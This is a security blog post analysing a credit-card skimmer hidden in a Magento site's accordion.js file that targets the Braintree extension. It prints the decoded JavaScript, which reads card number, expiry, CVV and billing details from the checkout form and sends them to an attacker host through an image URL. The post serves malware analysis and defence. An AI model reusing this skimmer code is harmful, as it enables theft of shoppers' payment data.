Magento Credit Card Stealer for Braintree Extension

We regularly find and write about malware that steals credit card details from Magento sites because attackers discover new techniques to obtain sensitive data daily. This time, the malicious code is specifically designed for Magento sites that use the Braintree extension. This extension connects a Magento store with the Braintree payment processing service that is supposed to be (among other things) adding extra security for credit card transactions. Ironically, hackers piggyback some of the Braintree objects in order to steal credit card details during the checkout process.
The obfuscated code was added in the js/varien/accordion.js file.
var _0x53bc = ["\x71\x20\x66\x3D\x45\x3B\x35\x3D\x27\x44\x27 \x3B\x43\x20…
Here’s what it looks like after decoding:

var se = false;
pf = 'gene_braintree_creditcard';

function timedMe() {
if (payment['currentMethod']) pf = payment['currentMethod'];
if ((!se) && (document.getElementById(pf + '_cc_number'))) {
fln = document.getElementById('billing_firstname').value + ' ' + document.getElementById('billing_lastname').value;
...skipped...
cn = document.getElementById(pf + '_cc_number').value.replace(/\s/g, '');
cem = document.getElementById(pf + '_expiration').value;
cey = document.getElementById(pf + '_expiration_yr').value;
cvv = document.getElementById(pf + '_cc_cid').value;
if ((cn.length == 16 && cvv.length == 3) || (cn.length == 15 && cvv.length == 4)) {
se = true;
var i = document.createElement('img');
i.src = 'hxxps://scriptb[.]com/l2.php?p=197' + encodeURIComponent('&fln=' + fln + '&ct=' + ct + '&cn=' + cn + '&cem=' + cem + '&cey=' + cey + '&cvv=' + cvv + '&co=' + co + '&ci=' + ci + '&st=' + st + '&ad=' + ad + '&zp=' + zp)
}
}
}
setInterval('timedMe()', 700);
Roughly every second, the timedMe function checks if the order form has been completed, meaning the customer has entered a credit card number and CVV, and sends the entered data to a remote server. To obtain the form data, the malicious code uses the Braintree gene_braintree_creditcard object which is used for regular credit card payments. They also have gene_braintree_paypal for PayPal payments, but in this particular case, the attackers are only interested in credit cards.
It’s interesting how hackers transfer the stolen sensitive data to their site. They dynamically build an image tag that links to the attacker-controlled “scriptb[.]com” site, passing all the stolen data in the image URL parameters (not even encrypting them).
Other files could also contain this malicious code, or even different code that will re-add the injection back in the site even after the above is removed. If this happens, just contact us. We will be happy to answer any of your questions as well as inspect and clean the website.
This case shows that if your ecommerce site has a checkout form where customers enter their credit card details, there is no way to prevent data theft if your site is hacked. Even using trusted third-party payment processing services behind the scenes will not help – the data is being stolen before it reaches them. That’s why you should really consider redirecting customers to trusted third-party payment processing sites to complete transactions rather than having them enter credit card details on your site. If you have more questions about ecommerce security or specifically around how to account for PCI compliance let us know.
